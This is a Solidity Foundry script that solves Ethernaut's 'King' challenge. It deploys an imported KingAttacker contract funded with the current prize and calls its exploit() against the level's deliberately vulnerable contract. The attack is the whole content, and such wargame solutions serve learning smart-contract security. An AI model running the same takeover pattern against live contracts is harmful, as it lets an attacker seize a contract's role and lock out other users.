// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IKing } from "ethernaut/09-king/IKing.sol";
import { KingAttacker } from "ethernaut/09-king/KingAttacker.sol";

contract KingScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address kingAddr = vm.envAddress("L09_KING_ADDRESS");
        IKing king = IKing(payable(kingAddr));

        // Step 1: get prize (0.0001 ether)
        uint256 prize = king.prize();

        // Step 2: deploy KingAttacker funded with >= 0.0001 ether
        KingAttacker kingAttacker = new KingAttacker{value: prize}();

        // Step 3: call exploit()
        kingAttacker.exploit(kingAddr, prize);

        vm.stopBroadcast();
    }
}
